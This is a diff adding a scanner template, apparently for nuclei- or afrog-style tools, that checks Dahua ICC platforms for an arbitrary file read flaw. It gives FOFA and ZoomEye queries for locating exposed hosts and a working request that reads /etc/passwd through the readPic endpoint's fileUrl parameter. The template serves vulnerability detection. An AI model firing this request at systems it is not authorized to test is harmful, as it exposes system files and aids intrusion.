@@ -1,0 +1,25 @@
+id: dahua-icc-readpic-fileread
+
+info:
+  name: Dahua Icc Readpic File Read
+  author: zan8in
+  severity: high
+  description: |-
+    Read Dahua Icc file
+    大华ICC，即大华浩睿智能物联综合管理平台。对技术组件进行模块化和松耦合，将解决方案分层分级，提高面向智慧物联的数据接入与生态合作能力。
+    FOFA: body="*客户端会小于800*"
+    ZoomEye: *客户端会小于800*
+  tags: dahua,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
